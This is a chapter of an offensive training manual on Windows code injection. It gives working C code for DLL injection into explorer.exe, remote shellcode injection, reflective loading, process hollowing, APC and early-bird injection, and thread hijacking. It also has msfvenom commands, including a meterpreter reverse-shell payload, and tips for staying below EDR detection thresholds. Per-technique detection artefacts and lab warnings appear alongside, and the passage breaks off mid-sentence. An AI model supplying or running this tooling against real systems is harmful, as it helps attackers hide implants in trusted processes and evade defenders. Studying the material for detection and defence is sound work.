# Chapter 10 — Code Injection: DLL, Shellcode & Process Hollowing

**VADER-RCE Field Manual**
**Prerequisite**: Ch01-08 (memory fundamentals, Windows internals, API basics)
**Drill**: DRILLS/10_code_injection/

---

## Why You Need This

You have code execution somewhere. A shell, a local access vector, a phishing
payload that ran. Now you need that code running somewhere ELSE — in a trusted
process, under a different token, persisting across sessions, invisible to
a cursory task manager glance.

Code injection is the bridge between "I have execution" and "I have the
right execution." Running your implant inside explorer.exe is different
from running it as a standalone process. Running inside lsass.exe is
different from running inside explorer.exe. The container matters.
The container determines the trust context, the network behaviour,
the privilege level, and the visibility to defenders.

This chapter is a toolkit. Each technique is a tool with specific use
cases, specific artefacts, and specific detection signatures. You pick
the right tool for the target environment. You understand what you leave
behind. You understand what the SOC analyst sees on the other side.

No technique in this chapter is magic. Every one leaves traces. Your
job is to understand those traces well enough to minimise them below
the detection threshold — or accept them when the operational window
is short enough that it doesn't matter.

---

## WINDOWS SETUP

Everything in this chapter requires compiling C code and working with
low-level Windows APIs. You come from Python. Here is exactly how to
get every tool running before you touch a single section below.

### Tools Required

| Tool | Purpose | Admin Required |
|------|---------|---------------|
| Visual Studio Build Tools | C compiler (cl.exe) for all C code in this chapter | YES |
| MinGW-w64 (gcc) | Alternative C compiler, lighter install | No |
| Process Hacker 2 | Inspect process memory, threads, module lists | YES (some features) |
| Sysmon | Kernel telemetry — logs injection artefacts | YES |
| x64dbg | Debugger — inspect running processes | No |
| msfvenom / Metasploit | Generate shellcode for Section 2 | No (WSL2) |
| sRDI | Convert DLL to shellcode | No |
| PE-bear | Parse PE headers visually | No |
| Process Monitor (ProcMon) | Watch DLL search order in real time | YES |

---

### Install Commands

#### Option A — MinGW-w64 (Recommended for Python devs, no IDE bloat)

```powershell
# Install winget if not already present (it is on Win11 by default)
winget install --id MSYS2.MSYS2 -e
```

After MSYS2 installs, open the MSYS2 UCRT64 terminal from Start Menu and run:

```bash
pacman -S mingw-w64-ucrt-x86_64-gcc
```

Then add MinGW to your Windows PATH. In PowerShell (admin):

```powershell
$mingwPath = "C:\msys64\ucrt64\bin"
[System.Environment]::SetEnvironmentVariable("PATH", $env:PATH + ";$mingwPath", "Machine")
```

Close and reopen PowerShell. Verify:

```powershell
gcc --version
# Expected output: gcc.exe (Rev..., Built by MSYS2 project) 13.x.x or higher
```

#### Option B — Visual Studio Build Tools (cl.exe, Microsoft compiler)

```powershell
winget install --id Microsoft.VisualStudio.2022.BuildTools -e
```

After install, use "Developer Command Prompt for VS 2022" from Start Menu
for all compile commands. Verify:

```cmd
cl
# Expected output: Microsoft (R) C/C++ Optimizing Compiler Version 19.xx...
```

---

#### Process Hacker 2

```powershell
winget install --id ProcessHacker.ProcessHacker -e
```

> WARNING: Process Hacker requires admin rights to inspect process memory
> and view full module lists. Always right-click → Run as administrator.

Verify: Open Process Hacker. You should see a full process list with PIDs
and CPU/memory columns. If it shows "Access Denied" on system processes,
you are not running as admin.

---

#### Sysmon (for Detection Exercises)

Download from Microsoft Sysinternals:

```powershell
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$env:TEMP\Sysmon.zip"
Expand-Archive "$env:TEMP\Sysmon.zip" -DestinationPath "$env:TEMP\Sysmon"
```

Install with a basic config (admin PowerShell):

```powershell
cd "$env:TEMP\Sysmon"
.\Sysmon64.exe -accepteula -i
# Expected output: Sysmon64 installed. Process Monitor logging started.
```

> WARNING: Requires admin. Once installed, Sysmon logs to Windows Event Log
> under: Applications and Services Logs > Microsoft > Windows > Sysmon > Operational

---

#### x64dbg

```powershell
winget install --id x64dbg.x64dbg -e
```

Verify: Launch x64dbg from Start Menu. You should see a dark-themed debugger
window with CPU/Memory tabs across the top.

---

#### msfvenom (WSL2 required)

msfvenom is a Linux tool. You need WSL2 first:

```powershell
# Run in PowerShell as Administrator
wsl --install
# Reboot when prompted, then set up Ubuntu username/password
```

After reboot, open Ubuntu from Start Menu and install Metasploit:

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

Verify (inside WSL2 Ubuntu terminal):

```bash
msfvenom --version
# Expected output: MsfVenom - a Metasploit standalone payload generator.
# Framework Version: 6.x.x-dev
```

---

#### sRDI

```powershell
git clone https://github.com/monoxgas/sRDI
cd sRDI
pip install pefile    # Python dependency
python ShellcodeRDI.py --help
# Expected output: usage: ShellcodeRDI.py [-h] [-v] [-d] ...
```

---

#### PE-bear

Download from: https://github.com/hasherezade/pe-bear/releases

No install required — unzip and run `PE-bear.exe` directly.

---

#### Process Monitor (ProcMon)

```powershell
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/ProcessMonitor.zip" -OutFile "$env:TEMP\ProcMon.zip"
Expand-Archive "$env:TEMP\ProcMon.zip" -DestinationPath "C:\Tools\ProcMon"
```

Verify: Run `C:\Tools\ProcMon\Procmon64.exe`. Accept the EULA. You should
see a live stream of system events. Press Ctrl+E to stop capture.

---

### How to Compile Every C Example in This Chapter

All C code blocks use Windows APIs. Use this compile command template
(MinGW / gcc):

```powershell
gcc -o output.exe source.c -lkernel32 -lntdll -lpsapi
```

For code using `winternl.h` (process hollowing, Section 4):

```powershell
gcc -o hollow.exe hollow.c -lkernel32 -lntdll
```

If you get "undefined reference" errors, add the relevant lib flag:
- Missing `CreateToolhelp32Snapshot`: add `-lkernel32`
- Missing `NtQueryInformationProcess`: add `-lntdll`

> WARNING: These programs manipulate other processes. Run them in a VM
> or isolated lab environment. Do NOT run injection code on your daily
> driver Windows install unless you understand exactly what you are doing.

---

## Section 1 — Classic DLL Injection

The grandfather of code injection. Four API calls. Works on every
Windows version that ever existed. Understood by every analyst and
every EDR on the planet. Use it when you need something that WORKS
and stealth is not the primary constraint.

### The Four-Call Chain

```
OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)
    │
    ▼
VirtualAllocEx(proc_handle, NULL, path_len, MEM_COMMIT, PAGE_READWRITE)
    │
    ▼
WriteProcessMemory(proc_handle, remote_addr, dll_path, path_len, NULL)
    │
    ▼
CreateRemoteThread(proc_handle, NULL, 0, LoadLibraryA, remote_addr, 0, NULL)
```

LoadLibraryA is the thread start address. It lives in kernel32.dll which
is mapped at the SAME BASE ADDRESS in every process (ASLR does not
randomize kernel32 across process boundaries — only across reboots).
So you can take the address of LoadLibraryA in YOUR process and use
it in the remote CreateRemoteThread call.

### Implementation

```c
#include <windows.h>      // Core Windows API types and functions
#include <tlhelp32.h>     // CreateToolhelp32Snapshot, PROCESSENTRY32
#include <stdio.h>        // printf

// Walk the process list and return the PID of the first process
// whose name matches proc_name (case-insensitive)
DWORD get_pid_by_name(const char *proc_name) {
    // Take a snapshot of all running processes
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };    // Must set dwSize before first call
    if (Process32First(snap, &pe)) {       // Seed the iterator
        do {
            // Case-insensitive compare against target name
            if (_stricmp(pe.szExeFile, proc_name) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;   // Found — return the PID
            }
        } while (Process32Next(snap, &pe)); // Advance to next entry
    }
    CloseHandle(snap);
    return 0;  // Not found
}

// Open the target process, write a DLL path into it,
// and create a remote thread that calls LoadLibraryA on that path
int inject_dll(DWORD pid, const char *dll_path) {
    // Open a handle to the target process with full access rights
    HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!proc) return 1;  // Fails if process is higher integrity or protected

    // +1 for the null terminator that LoadLibraryA requires
    size_t path_len = strlen(dll_path) + 1;

    // Allocate a buffer inside the TARGET process's address space
    // PAGE_READWRITE — we only need to write the path string here, not execute it
    LPVOID remote_buf = VirtualAllocEx(
        proc, NULL, path_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (!remote_buf) { CloseHandle(proc); return 1; }

    // Copy the DLL path string from OUR process into the TARGET process
    WriteProcessMemory(proc, remote_buf, dll_path, path_len, NULL);

    // Create a thread in the target process that starts at LoadLibraryA
    // LoadLibraryA's argument is a pointer to a string — remote_buf IS that string
    // kernel32.dll is at the same address in every process (no per-process ASLR)
    HANDLE thread = CreateRemoteThread(
        proc, NULL, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(
            GetModuleHandleA("kernel32.dll"), "LoadLibraryA"
        ),
        remote_buf, 0, NULL
    );
    if (!thread) { CloseHandle(proc); return 1; }

    WaitForSingleObject(thread, INFINITE);  // Block until DLL is loaded
    CloseHandle(thread);
    CloseHandle(proc);
    return 0;
}

int main(int argc, char **argv) {
    // inject_dll into explorer.exe
    DWORD pid = get_pid_by_name("explorer.exe");
    if (!pid) { printf("[-] target not found\n"); return 1; }
    printf("[*] injecting into PID %lu\n", pid);
    return inject_dll(pid, "C:\\Users\\Public\\payload.dll");
}
```

#### Compile and Run

```powershell
# Compile (MinGW)
gcc -o dll_inject.exe dll_inject.c -lkernel32

# Run — requires payload.dll to exist at C:\Users\Public\payload.dll
.\dll_inject.exe
```

#### Expected Output

Success:
```
[*] injecting into PID 8432
```
Then open Process Hacker → find explorer.exe → right-click → Properties →
Modules tab → `payload.dll` should appear in the list.

Failure looks like:
```
[-] target not found
```
Means explorer.exe is not running (unlikely) or your process name string
has a typo — check the exact name in Task Manager.

Failure looks like `inject_dll` returning 1 silently — means
`OpenProcess` failed. Run your injector as Administrator or target a
process at the same integrity level as yours.

---

### Required Privileges

```
PROCESS_ALL_ACCESS is maximum rights. You can drop this to the
minimum set required:
    PROCESS_VM_WRITE      — WriteProcessMemory
    PROCESS_VM_OPERATION  — VirtualAllocEx
    PROCESS_CREATE_THREAD — CreateRemoteThread

Injecting into processes of EQUAL OR LOWER integrity level works
without special privileges.

Injecting into HIGHER integrity (e.g., from medium into high):
→ Requires SeDebugPrivilege
→ Enabled by default for admins, disabled by default for standard users
→ Enable it: AdjustTokenPrivileges()

Injecting into protected processes (PPL — Protected Process Light):
→ lsass.exe, antimalware services, etc.
→ Standard injection will fail with ACCESS_DENIED
→ Requires kernel-level access (driver) or PPL downgrade exploit
```

### Detection Artefacts

```
ARTEFACT                           DETECTION METHOD
─────────────────────────────────────────────────────
OpenProcess(ALL_ACCESS)            ETW: Microsoft-Windows-Kernel-Process
                                   Sysmon Event ID 10 (ProcessAccess)

VirtualAllocEx + WriteProcessMemory ETW: Microsoft-Windows-Kernel-Memory
                                    WPM on another process = red flag

CreateRemoteThread                  ETW: Microsoft-Windows-Kernel-Process
                                    Sysmon Event ID 8 (CreateRemoteThread)
                                    Thread start at LoadLibraryA = classic sig

DLL on disk at injected path        File system monitoring
                                    EDR file creation hooks
                                    Disk artefacts survive reboot

Loaded DLL in target process        Process memory scan (EDR)
                                    Module list vs known-good baseline
                                    DLL not in standard module list
```

Classic DLL injection is LOUD. Every EDR watches the exact API sequence.
If your threat model includes EDR, step up to a less visible technique.
If it doesn't (CTF, lab, unmonitored environment), classic injection works
fine and is much simpler to debug.

---

## Section 2 — Shellcode Injection

No DLL on disk. No LoadLibrary. Raw machine code written directly into
remote process memory and executed there. Reduces file system artefacts
to zero — the payload only exists in memory.

### The Core Pattern

```
VirtualAllocEx(proc, NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    │
    ▼
WriteProcessMemory(proc, remote_buf, shellcode, shellcode_len, NULL)
    │
    ▼
CreateRemoteThread(proc, NULL, 0, remote_buf, NULL, 0, NULL)
```

The difference from DLL injection: remote_buf IS the thread start address.
Your shellcode is the function. No LoadLibrary needed. No DLL on disk.

### Shellcode Sources

```
msfvenom — Metasploit payload generation:
    msfvenom -p windows/x64/meterpreter/reverse_tcp \
        LHOST=10.0.0.1 LPORT=4444 \
        -f c > shellcode.h

    msfvenom -p windows/x64/exec CMD="calc.exe" \
        -f hex

donut — convert .NET/PE/shellcode to position-independent code:
    donut -f payload.exe -a 2 -o shellcode.bin

sRDI — convert DLL to shellcode (position-independent DLL):
    python ShellcodeRDI.py payload.dll
    → outputs raw PIC shellcode, no loader needed

Custom — write your own:
    NASM or MASM for raw ASM
    C compiled with -fPIC equivalent flags
    Must be position-independent (no absolute addresses)
    Must resolve all APIs dynamically at runtime
```

### Generating Test Shellcode (calc.exe spawner — safe, no network)

Run this inside WSL2:

```bash
# Generate shellcode that pops calc.exe — safe for lab testing
msfvenom -p windows/x64/exec CMD="calc.exe" -f c -o shellcode.h
```

#### Expected Output

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows...
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 276 bytes
Final size of c file: 1186 bytes
Saved as: shellcode.h
```

Failure looks like: `No such payload` — means you typed the platform wrong.
Use `msfvenom --list payloads | grep exec` to find the exact name.

Copy `shellcode.h` from your WSL2 home to Windows:

```bash
# Inside WSL2
cp shellcode.h /mnt/c/Users/Public/shellcode.h
```

### Two-Stage Allocation (Stealth Improvement)

```c
// Stage 1: Allocate RW only — write shellcode into it
// PAGE_READWRITE means this region can't execute yet (safer, less detectable)
LPVOID remote_buf = VirtualAllocEx(
    proc, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
);
WriteProcessMemory(proc, remote_buf, shellcode, shellcode_len, NULL);

// Stage 2: Flip permissions from RW to RX
// Separating write and execute phases avoids the RWX red flag
DWORD old_protect;
VirtualProtectEx(proc, remote_buf, shellcode_len, PAGE_EXECUTE_READ, &old_protect);

// Stage 3: Execute — thread starts at the shellcode address
CreateRemoteThread(proc, NULL, 0,
    (LPTHREAD_START_ROUTINE)remote_buf, NULL, 0, NULL
);
```

#### Expected Output

If shellcode is `calc.exe` spawner: Calculator opens on the desktop.
You will see it as a child process of your target process in Process Hacker.

Failure looks like: nothing happens, `CreateRemoteThread` returns NULL.
Call `GetLastError()` to diagnose — error 5 = Access Denied (wrong
integrity level), error 87 = invalid parameter (shellcode_len is 0).

### Detection Artefacts

```
PAGE_EXECUTE_READWRITE regions in process memory  — memory scanner
Shellcode signatures in memory                    — YARA signatures via EDR
Suspicious thread start address                   — not in any module's .text
CreateRemoteThread                                — Sysmon Event ID 8
VirtualProtectEx call                             — ETW kernel memory events
```

The big win over classic DLL injection: no file on disk. The downside:
shellcode has no persistence mechanism built in. If the process dies,
the shellcode dies with it. DLLs can run DllMain on attach, have export
tables, and are trivially loadable again. Shellcode is single-shot.

---

## Section 3 — Reflective DLL Injection

A DLL that loads ITSELF into memory without calling LoadLibrary and
without appearing in the target's module list. The DLL contains its own
miniature PE loader as an exported function. That function resolves
imports, applies relocations, and maps the DLL sections — all from within
the target process's address space.

This is the technique powering Meterpreter's `migrate` and Cobalt
Strike's `inject` command.

### How It Works

```
Traditional DLL injection:
    Injector → calls LoadLibraryA in target → Windows loader loads DLL
    → DLL appears in PEB.Ldr module list → EDR sees new module

Reflective DLL injection:
    Injector → copies raw DLL bytes into target memory
            → calls ReflectiveLoader() export at offset within those bytes
    → ReflectiveLoader():
        1. Finds its own base address (walks backward from return address)
        2. Parses its own PE headers (IMAGE_NT_HEADERS, sections, imports)
        3. Allocates new memory: VirtualAlloc(preferred_size, MEM_COMMIT, RWX)
        4. Copies each section to the new allocation
        5. Applies base relocations (fixes absolute addresses)
        6. Resolves all imports by walking PEB module list for kernel32/ntdll
        7. Calls DllMain(DLL_PROCESS_ATTACH)
    → DLL is running but NOT in the module list (never called LdrLoadDll)
```

### Using sRDI (Shellcode Reflective DLL Injection)

```bash
# Convert existing DLL to shellcode (includes its own loader)
git clone https://github.com/monoxgas/sRDI
cd sRDI

python3 ShellcodeRDI.py payload.dll

# Output: payload.bin — raw position-independent shellcode
# Inject this exactly like shellcode (Section 2)
# No trace in module list
# No file on disk
```

#### Expected Output

```
[*] Shellcode size: 14336 bytes
[*] Saved to: payload.bin
```

Failure looks like: `ImportError: No module named pefile` — run
`pip install pefile` first.

Failure looks like: `Error: DLL not found` — check your path to
`payload.dll` is correct and the file exists.

### Writing Your Own ReflectiveLoader

The core logic in pseudocode:

```c
// This function is exported as "ReflectiveLoader"
// It receives no arguments — must find its own location in memory
ULONG_PTR WINAPI ReflectiveLoader(void) {

    // Step 1: Find our own base address
    // We are position-independent — we cannot use globals or hardcoded addresses
    // Walk backward from the current instruction pointer until we hit 'MZ' (0x5A4D)
    ULONG_PTR rip;
    __asm__ __volatile__("lea %0, [rip]" : "=r"(rip));  // Get current RIP value
    ULONG_PTR base = rip;
    while (*(WORD*)base != 0x5A4D) base--;  // 'MZ' = start of any PE file

    // Step 2: Parse PE headers — same layout as any Windows executable
    // 0x3C offset in the DOS header points to the NT headers offset
    IMAGE_NT_HEADERS *nt = (void*)(base + *(DWORD*)(base + 0x3C));
    IMAGE_SECTION_HEADER *sections = IMAGE_FIRST_SECTION(nt);  // Macro in winnt.h

    // Step 3: Allocate a new home for ourselves in the target process
    // Try the preferred base first — if taken, Windows will pick another address
    ULONG_PTR new_base = (ULONG_PTR)VirtualAlloc(
        (void*)nt->OptionalHeader.ImageBase,
        nt->OptionalHeader.SizeOfImage,    // Full virtual size including section gaps
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );

    // Step 4: Copy PE headers to new location (needed for our own parsing later)
    memcpy((void*)new_base, (void*)base, nt->OptionalHeader.SizeOfHeaders);

    // Copy each section (code, data, resources, etc.) to its virtual address
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        memcpy(
            (void*)(new_base + sections[i].VirtualAddress),   // Destination in new allocation
            (void*)(base + sections[i].PointerToRawData),     // Source from original bytes
            sections[i].SizeOfRawData
        );
    }

    // Step 5: Apply base relocations
    // If we didn't land at our preferred ImageBase, all absolute addresses are wrong
    // delta = how far off we are from preferred base
    ULONG_PTR delta = new_base - nt->OptionalHeader.ImageBase;
    // ... walk IMAGE_DIRECTORY_ENTRY_BASERELOC, apply delta to each entry

    // Step 6: Resolve imports
    // Walk IMAGE_DIRECTORY_ENTRY_IMPORT for each DLL we depend on
    // Find each DLL in PEB.Ldr by name hash (avoid GetModuleHandle — its string is detectable)
    // Find each function by walking that DLL's export directory
    // Write resolved function addresses into our Import Address Table (IAT)

    // Step 7: Call our own entry point — we are now fully mapped and ready
    DllEntryPoint = (BOOL(WINAPI*)(HINSTANCE,DWORD,LPVOID))(
        new_base + nt->OptionalHeader.AddressOfEntryPoint
    );
    DllEntryPoint((HINSTANCE)new_base, DLL_PROCESS_ATTACH, NULL);

    return new_base;  // Return our new base so the injector knows where we landed
}
```

### Detection Artefacts

```
Not in PEB module list                — breaks module enumeration tools
                                        Detected by: !lmi in WinDbg, memory scanners

Memory with RWX permissions           — VirtualAlloc RWX flag
                                        Detected by: Process Hacker, memory scanners

PE headers in non-module memory       — YARA: MZ+PE signature in heap
                                        Detected by: EDR memory scanning

Private memory with executable code   — anomaly vs normal DLL-mapped regions
                                        Detected by: VAD (Virtual Address Descriptor)
                                        analysis — no corresponding file mapping
```

The absence from the module list is both the advantage and a detection
signal. Normal processes have executable memory only in mapped modules.
A region that's executable but has no mapped file backing it is anomalous.
Defenders know this. Memory forensics tools (Volatility `malfind`) hunt
for exactly this pattern.

---

## Section 4 — Process Hollowing

Create a legitimate process in suspended state. Hollow out its code.
Fill it with your payload. Resume execution. The process looks like
a legitimate binary from the outside — same path, same PID lineage,
same image name — but runs your code.

### The Sequence

```
CreateProcess(target_exe, ..., CREATE_SUSPENDED, ...)
    │
    ▼
Read PEB to find ImageBase (NtQueryInformationProcess or manual PEB walk)
    │
    ▼
NtUnmapViewOfSection(proc_handle, image_base)  — hollow out the original image
    │
    ▼
VirtualAllocEx(proc_handle, preferred_base, payload_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    │
    ▼
WriteProcessMemory(proc_handle, new_base, payload_pe_headers)
WriteProcessMemory(proc_handle, new_base + section.VirtualAddress, payload_section_data)
    ... (for each section)
    │
    ▼
SetThreadContext(main_thread, ...) — set RIP to new entry point
    │
    ▼
ResumeThread(main_thread)
```

### Implementation

```c
#include <windows.h>      // Core Windows API
#include <winternl.h>     // PROCESS_BASIC_INFORMATION, NtQueryInformationProcess

// NtUnmapViewOfSection is not in any import library — must get it at runtime
typedef NTSTATUS (WINAPI *pfnNtUnmapViewOfSection)(HANDLE, PVOID);

void hollow_process(const char *target_path, BYTE *payload, DWORD payload_size) {
    STARTUPINFOA si = { sizeof(si) };   // Must zero-init and set cb field
    PROCESS_INFORMATION pi;             // Receives handles to new process and thread

    // Step 1: Spawn target process in suspended state
    // CREATE_SUSPENDED = main thread is created but doesn't run yet
    if (!CreateProcessA(target_path, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return;
    }

    // Step 2: Query the target process to find where its PEB lives
    PROCESS_BASIC_INFORMATION pbi;
    NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
                              &pbi, sizeof(pbi), NULL);

    // PEB + 0x10 = the ImageBaseAddress field (offset is fixed across Win versions)
    PVOID peb_image_base_addr = (PBYTE)pbi.PebBaseAddress + 0x10;
    PVOID image_base;
    // Read the ImageBase value out of the target process's PEB
    ReadProcessMemory(pi.hProcess, peb_image_base_addr,
                      &image_base, sizeof(image_base), NULL);

    // Step 3: Unmap (hollow out) the original executable from the process
    // NtUnmapViewOfSection is undocumented — must resolve from ntdll at runtime
    pfnNtUnmapViewOfSection NtUnmap =
        (pfnNtUnmapViewOfSection)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"
        );
    NtUnmap(pi.hProcess, image_base);   // Remove the original image mapping

    // Step 4: Parse our payload's PE headers to know its size and preferred base
    // 0x3C = e_lfanew field in IMAGE_DOS_HEADER — offset to NT headers
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS*)(payload + *(DWORD*)(payload + 0x3C));
    DWORD payload_img_size = nt->OptionalHeader.SizeOfImage;
    PVOID preferred_base = (PVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase;

    // Step 5: Allocate space in the now-hollow process for our payload
    PVOID new_base = VirtualAllocEx(
        pi.hProcess, preferred_base, payload_img_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );

    // Step 6: Write payload PE headers (not sections yet, just the header block)
    WriteProcessMemory(pi.hProcess, new_base, payload,
                       nt->OptionalHeader.SizeOfHeaders, NULL);

    // Step 7: Write each section of the payload to its virtual address
    IMAGE_SECTION_HEADER *sections = IMAGE_FIRST_SECTION(nt); // Macro: points past OptionalHeader
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        PVOID dest = (PBYTE)new_base + sections[i].VirtualAddress;  // Where it lives in memory
        PVOID src  = payload + sections[i].PointerToRawData;         // Where it lives on disk
        WriteProcessMemory(pi.hProcess, dest, src,
                           sections[i].SizeOfRawData, NULL);
    }

    // Step 8: Update PEB.ImageBaseAddress to reflect our new payload's base
    // Without this, tools reading the PEB will see the old (now-gone) base address
    WriteProcessMemory(pi.hProcess, peb_image_base_addr,
                       &new_base, sizeof(new_base), NULL);

    // Step 9: Redirect the suspended main thread's RIP to our payload's entry point
    // RCX = first argument to the entry point (which is the HINSTANCE)
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;    // Request all registers
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rcx = (DWORD64)((PBYTE)new_base + nt->OptionalHeader.AddressOfEntryPoint);
    SetThreadContext(pi.hThread, &ctx);

    // Step 10: Let the thread run — it now executes OUR payload, not the original binary
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
```

#### Compile

```powershell
gcc -o hollow.exe hollow.c -lkernel32 -lntdll
```

#### Expected Output

When the hollow succeeds: the target binary (e.g., notepad.exe) appears
in Task Manager with its normal name, but in Process Hacker → Memory tab
the sections will NOT match the on-disk notepad.exe binary. The PE headers
in memory will belong to your payload.

Failure looks like: target process crashes immediately on resume. Common
cause: payload's preferred ImageBase is different from where it actually
landed — you need to apply base relocations before resuming. This is left
as an exercise (the .reloc section must be walked and patched).

Failure looks like: `NtUnmap` is NULL — means GetProcAddress failed.
Check you are calling `GetModuleHandleA("ntdll.dll")` not "ntdll" (no extension causes failure on some configs).

---

### Choosing The Target Binary

```
GOOD TARGETS (common, trusted, network-connected):
    svchost.exe         — runs hundreds of instances, blends perfectly
    explorer.exe        — user-context, network access
    notepad.exe         — simple, stable, rarely scrutinized
    msiexec.exe         — legitimately makes network calls
    regsvr32.exe        — bypasses AppLocker in some configs

BAD TARGETS:
    lsass.exe           — protected process, injection fails
    System              — not a normal PE, will crash immediately
    Anything with PPL   — protected process light, Access Denied
```

### Detection Artefacts

```
Process image path ≠ actual code running     — PE header in memory ≠ file on disk
                                               Detected by: memory forensics,
                                               EDR code integrity checks

NtUnmapViewOfSection on own image            — unusual API call
                                               Detected by: ETW, API hooking

PAGE_EXECUTE_READWRITE on entire image       — normal images use mixed page perms
                                               Detected by: memory scanners

PEB.ImageBase ≠ mapped file backing         — discrepancy in VAD tree
                                               Detected by: Volatility dlllist vs
                                               malfind comparison

Suspended thread RIP set manually           — SetThreadContext before resume
                                               Detected by: Sysmon Event ID 8
                                               (thread injection), EDR hooks
```

---

## Section 5 — APC Injection

Asynchronous Procedure Calls. Every thread has an APC queue. When a
thread enters an alertable wait state, it drains the queue and executes
each entry. You queue your shellcode as an APC. The thread runs it
when it next enters an alertable wait.

### The Sequence

```
OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)
    │
    ▼
VirtualAllocEx + WriteProcessMemory (same as shellcode injection)
    │
    ▼
OpenThread(THREAD_SET_CONTEXT, FALSE, target_tid)
    │
    ▼
QueueUserAPC(shellcode_addr, target_thread, 0)
    │
    ▼
Wait for thread to enter alertable state (SleepEx, WaitForSingleObjectEx, etc.)
    │
    ▼
Shellcode executes in context of target thread
```

### Thread Selection

Not all threads enter alertable states. You need to find one that does.

```c
// Enumerate threads of target process to find candidates for APC injection
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);  // Snapshot all threads
THREADENTRY32 te = { sizeof(te) };
DWORD target_pid = ...; // your target

if (Thread32First(snap, &te)) {
    do {
        // Filter to only threads belonging to our target process
        if (te.th32OwnerProcessID == target_pid) {
            // Queue APC to every thread — at least one will be alertable
            // THREAD_SET_CONTEXT = minimum right needed to queue an APC
            HANDLE thread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
            if (thread) {
                QueueUserAPC(
                    (PAPCFUNC)shellcode_remote_addr,  // Address in target process's memory
                    thread,
                    0   // No argument passed to the APC function
                );
                CloseHandle(thread);
            }
        }
    } while (Thread32Next(snap, &te));
}
```

Queuing to ALL threads of the target increases the chance one is in an
alertable wait when you queue. This is noisy but reliable.

### Early-Bird APC Injection

The stealth variant. Create the target process SUSPENDED. Queue an APC
before the process has run a single instruction. When the main thread
initialises and calls NtTestAlert() as part of its startup sequence,
it drains the APC queue — YOUR code runs BEFORE the process's own code.
This means the EDR has had zero opportunity to observe the process, hook
its APIs, or baseline its state.

```c
// Create process suspended — not a single instruction has run yet
CreateProcessA(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,
               NULL, NULL, &si, &pi);

// Allocate and write shellcode BEFORE the process has had a chance to run
// PAGE_EXECUTE_READWRITE for simplicity in this example
LPVOID remote_buf = VirtualAllocEx(
    pi.hProcess, NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE
);
WriteProcessMemory(pi.hProcess, remote_buf, shellcode, shellcode_len, NULL);

// Queue APC to the main thread (which is still suspended)
// When the thread wakes up and calls NtTestAlert, this fires first
QueueUserAPC((PAPCFUNC)remote_buf, pi.hThread, 0);

// Resume — the FIRST thing the main thread does is drain the APC queue
// Your shellcode runs before any of the target's own initialization code
ResumeThread(pi.hThread);
```

Early-bird is cleaner than standard APC injection because:
- Process is brand new — no EDR hooks yet if userland hooks are the detection method
- APC runs before process initialization completes — no behavioral baseline yet
- No thread enumeration needed — you control the main thread

### Detection Artefacts

```
QueueUserAPC                          — ETW: thread APC events
                                        Sysmon: limited visibility here
                                        Most EDRs do NOT flag QueueUserAPC alone

APC target in non-module memory       — Detected if EDR inspects APC queue contents
                                        Uncommon but possible in mature EDRs

Early-bird: VirtualAllocEx on brand   — Same artefacts as shellcode injection
new process before it runs            — Pattern: CreateProcess(SUSPENDED) +
                                        VirtualAllocEx + QueueUserAPC + Resume
                                        = strong signal for mature EDRs
```

---

## Section 6 — Thread Hijacking

No new thread. No APC queue. Take a running thread, freeze it, redirect
its execution pointer, let it run your code, restore it.

### The Sequence

```
SuspendThread(target_thread)
    │
    ▼
GetThreadContext(target_thread, &ctx)
    │
    ▼
// Write shellcode somewhere in target process
VirtualAllocEx + WriteProcessMemory
    │
    ▼
// Modify RIP to point at shellcode
ctx.Rip = shellcode_remote_addr;
// Optionally: save original RIP on stack for shellcode to return to
*(DWORD64*)(ctx.Rsp - 8) = ctx.Rip; ctx.Rsp -= 8;  // push original RIP
    │
    ▼
SetThreadContext(target_thread, &ctx)
    │
    ▼
ResumeThread(target_thread)
```

### Caveats

```
Race condition: between SuspendThread and GetThreadContext, the thread
might be in a critical section or holding a mutex. If you redirect it
mid-critical-section, the target process may deadlock or crash.

Safe redirect points:
    Thread waiting on an event (WAIT_OBJECT_0)
    Thread sleeping (SleepEx)
    Thread blocked on I/O
    WaitForSingleObject in the GetMessage pump (GUI threads)

Danger zones:
    Thread holding a heap lock — heap operations will deadlock
    Thread inside ntdll loader lock — module loads will deadlock
    Thread in kernel transition — undefined behavior

Shellcode must preserve and restore all registers and stack alignment.
Treat it like a signal handler — you interrupted arbitrary code, you
